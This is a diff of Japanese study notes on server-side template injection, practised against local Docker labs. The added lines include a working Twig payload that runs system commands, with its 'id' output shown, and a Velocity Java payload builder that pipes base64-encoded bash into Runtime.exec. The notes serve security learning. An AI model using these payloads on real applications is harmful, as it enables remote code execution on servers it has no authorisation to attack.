@@ -39,8 +39,11 @@
 ## 概要
 `<% %>`とかでViewの中に変数のデータを表示させたいときに、ユーザーの入力をそのTemplate構文の中に
 入れるとRCEの脆弱性になるかもしれない。python,php,NodeJS,Ruby,Javaなど様々なTemplate構文においてその危険性がある。   
+## websitesVulnerableToSSTI
+https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
+以下のtplmapよりも多くのほぼすべてのテンプレートエンジンの環境があって、しかも`exploit.py`もついてる！！神！！   
 
-## tplmal (SSTI practice)
+## tplmap (SSTI practice)
 https://github.com/epinna/tplmap   
 SSTI検知ツールで、各テンプレートエンジンの脆弱な環境もDockerで用意されている。   
 ### setup
@@ -216,7 +219,7 @@ $twig = new Twig_Environment($loader);
 echo generateRandomString() . $twig->render('tpl') . generateRandomString();
  ?>
  ```
-以下でTwigかJinja2かまで絞れるらしい。   
+以下でTwigとわかる。   
 ```txt
 http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=*
 Zrqshc5ipK*0ZtRqxO5nV
@@ -243,6 +246,11 @@ UtRvAOJ2Ww2XWUpgIfMa
 
 http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.setCache(%22http://127.0.0.1:9500%22)}}
 ouc3MNd81U9v7WqfaxuT
+```
+以下でRCEできたー！`eval`だとなんかダメだった。   
+```txt
+/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22system%22)}}{{_self.env.getFilter(%22id%22)}}
+fGNvg4mElu"uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)"2ioR6Zpqxg
 ```
 ### Java
 #### velocity
@@ -313,6 +321,15 @@ c7afdf02-9829-4da6-ae80-fe2a914af8ae{{7*7}}3d299313-456d-40ca-b9bb-ccaf03f22db6
 以下を送信するとSymantecが`Java Payload attack`を検出しちゃってDockerでは試せない…。   
 ```txt
 192.168.99.100:15003/velocity?inj=$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
+```
+以下でReverse shellできうるとからしい   
+```python
+payload ='''
+#set($engine="")
+#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<%s|{base64,--decode})}"))
+#set($null=$proc.waitFor())
+${null}
+'''%base64.b64encode("sleep 5")
 ```
 #### freemarker
 `template = new Template("name", new StringReader(tpl),  new Configuration());`で解析してる？？`StringReader()`の中にテンプレートを入れれば良さそう。   
